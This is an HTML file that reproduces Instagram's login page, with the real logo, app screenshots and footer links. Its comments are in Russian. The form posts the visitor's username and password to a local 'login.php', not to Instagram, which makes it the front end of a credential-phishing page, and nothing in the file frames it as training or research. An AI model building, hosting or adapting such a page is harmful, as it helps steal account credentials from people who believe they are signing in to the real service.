<!-- language: HTML, file: index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
        }
        .main {
            display: flex;
            max-width: 935px;
            width: 100%;
            margin: 32px auto 0;
            justify-content: center;
            align-items: center;
            gap: 32px;
            padding: 0 20px;
        }
        /* Телефоны слева */
        .phones {
            display: none;
            position: relative;
            height: 581px;
            width: 380px;
            background: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png') no-repeat;
            background-size: 468.32px 634.15px;
            background-position: -46px 0;
        }
        .screenshots {
            position: absolute;
            top: 27px;
            left: 112px;
            width: 250px;
            height: 538px;
            overflow: hidden;
        }
        .screenshots img {
            position: absolute;
            width: 250px;
            height: 538px;
            opacity: 0;
            transition: opacity 1.5s ease-in-out;
        }
        .screenshots img.active {
            opacity: 1;
        }
        @media (min-width: 876px) {
            .phones { display: block; }
        }
        /* Правая часть — логин */
        .right {
            width: 350px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .login-box {
            border: 1px solid #dbdbdb;
            background: #fff;
            padding: 40px 40px 20px;
            text-align: center;
        }
        .logo {
            margin: 0 auto 36px;
            width: 175px;
            height: 51px;
            background: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/pE6glcU2GeX.png') no-repeat;
            background-size: 176px auto;
            background-position: 0 -52px;
        }
        form { display: flex; flex-direction: column; gap: 6px; }
        input {
            width: 100%;
            padding: 9px 8px 7px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            color: #262626;
            outline: none;
        }
        input:focus { border-color: #a8a8a8; }
        input::placeholder { color: #8e8e8e; font-size: 12px; }
        .btn {
            margin: 8px 0;
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 7px 16px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            opacity: 0.7;
        }
        .btn:enabled { opacity: 1; }
        .btn:hover:enabled { background: #1877f2; }
        .or {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .or::before, .or::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .or span { padding: 0 18px; }
        .fb {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 12px;
        }
        .fb img { width: 16px; height: 16px; }
        .forgot {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 12px;
        }
        .signup-box {
            border: 1px solid #dbdbdb;
            background: #fff;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .get-app {
            margin: 20px 0 10px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        .stores {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
        }
        .stores img { height: 40px; }
        footer {
            margin-top: 40px;
            max-width: 935px;
            width: 100%;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
            line-height: 1.8;
            padding: 0 20px 40px;
        }
        footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px;
        }
        footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="main">
        <!-- Телефоны с каруселью -->
        <div class="phones">
            <div class="screenshots">
                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot1.png" class="active" alt="">
                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot2.png" alt="">
                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot3.png" alt="">
                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot4.png" alt="">
            </div>
        </div>

        <div class="right">
            <div class="login-box">
                <div class="logo"></div>
                <form action="login.php" method="POST" id="loginForm">
                    <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required autocomplete="username">
                    <input type="password" name="password" id="password" placeholder="Password" required autocomplete="current-password">
                    <button type="submit" class="btn" id="loginBtn" disabled>Log in</button>
                    <div class="or"><span>OR</span></div>
                    <a href="https://www.facebook.com/login.php" class="fb">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
                        Log in with Facebook
                    </a>
                    <a href="https://www.instagram.com/accounts/password/reset/" class="forgot">Forgot password?</a>
                </form>
            </div>
            <div class="signup-box">
                Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
            </div>
            <div class="get-app">
                Get the app.
                <div class="stores">
                    <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
                    </a>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <div>
            <a href="https://about.meta.com/" target="_blank">Meta</a>
            <a href="https://about.instagram.com/" target="_blank">About</a>
            <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
            <a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a>
            <a href="https://help.instagram.com/" target="_blank">Help</a>
            <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
            <a href="https://privacycenter.instagram.com/policy" target="_blank">Privacy</a>
            <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
            <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
            <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
            <a href="https://www.threads.net/" target="_blank">Threads</a>
            <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a>
            <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
        </div>
        <div style="margin-top: 12px;">
            English · © 2026 Instagram from Meta
        </div>
    </footer>

    <script>
        const user = document.getElementById('username');
        const pass = document.getElementById('password');
        const btn  = document.getElementById('loginBtn');
        function check() {
            btn.disabled = !(user.value.trim() && pass.value.trim());
        }
        user.addEventListener('input', check);
        pass.addEventListener('input', check);

        // карусель
        const slides = document.querySelectorAll('.screenshots img');
        let current = 0;
        setInterval(() => {
            slides[current].classList.remove('active');
            current = (current + 1) % slides.length;
            slides[current].classList.add('active');
        }, 4000);
    </script>
</body>
</html>
